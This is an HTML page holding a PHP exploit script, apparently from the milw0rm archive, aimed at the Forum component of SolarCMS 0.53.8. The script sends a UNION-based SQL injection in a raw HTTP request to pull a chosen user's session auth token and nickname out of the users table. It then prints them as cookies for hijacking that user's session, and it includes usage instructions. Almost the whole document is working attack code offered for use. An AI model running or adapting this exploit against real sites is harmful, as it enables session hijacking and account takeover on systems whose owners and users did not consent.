<html><head><title>SolarCMS 0.53.8 (Forum) Remote Cookies Disclosure Exploit</title></head><pre>&lt;?php

error_reporting(0);

/***************************************************************
 *  ---------------------------------------------------------  * 
 *  SolarCMS 0.53.8 (Forum) Remote Cookies Disclosure Exploit  *
 *  ---------------------------------------------------------  *
 *  by athos - staker[at]hotmail[dot]it                        *
 *  download on http://cms.maury91.org/                        *
 *  works regardless PHP.ini settings                          *                     
 *  ---------------------------------------------------------  *
 ***************************************************************/


list($file,$host,$path,$myid,$table) = $argv;

if($argc != 5) usage();

$cookie = (preg_match('/\^(.+?)\^/',get_cookies(),$out)) ? explode(':',$out[1]) : error();

if($path == '/')
{
      print &quot;_nick={$cookie[1]}; path=/;\n&quot;;
      print &quot;_sauth={$cookie[0]}; path=/;\n&quot;;
      exit;
}     
else
{
      print &quot;/{$path}_nick={$cookie[1]}; path=/;\n&quot;;
      print &quot;/{$path}_sauth={$cookie[0]}; path=/;\n&quot;;
      exit;
}      
 
 
 

function get_cookies()
{
      global $host,$path,$myid,$table;
       
      $data .= &quot;GET {$path}/index.php?com=Forum&amp;cat=-1+union+select+1,&quot;;
      $data .= &quot;concat(0x5e,sauth,0x3a,nick,0x5e),3+from+{$table}+where+id={$myid}-- HTTP/1.1\r\n&quot;;
      $data .= &quot;Host: {$host}\r\n&quot;;
      $data .= &quot;User-Agent: Mozilla/4.5 [en] (Win95; U)\r\n&quot;;
      $data .= &quot;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n&quot;;
      $data .= &quot;Connection: close\r\n\r\n&quot;;

      
      
      if(!$sock = fsockopen($host,80)) die(&quot;connection refused\n&quot;);
      
      fputs($sock,$data);
      
      while(!feof($sock))
      {
            $html .= fgets($sock);
      }    
      
      fclose($sock);
      return $html;
}     


       
function error()
{
      print &quot;Exploit Failed!\n&quot;;
      print &quot;Regards ;)\n&quot;;
      exit;
}

function usage()
{
      print &quot;---------------------------------------------------------\n&quot;;    
      print &quot;SolarCMS 0.53.8 (Forum) Remote Cookies Disclosure Exploit\n&quot;;
      print &quot;---------------------------------------------------------\n&quot;;
      print &quot;by athos - staker[at]hotmail[dot]it\n&quot;;
      print &quot;Usage: php xpl.php [host] [path] [userid] [table]\n&quot;;
      print &quot;php xpl.php localhost /  1 solarcms_users\n&quot;;
      exit;

}

# milw0rm.com [2008-12-22]</pre></html>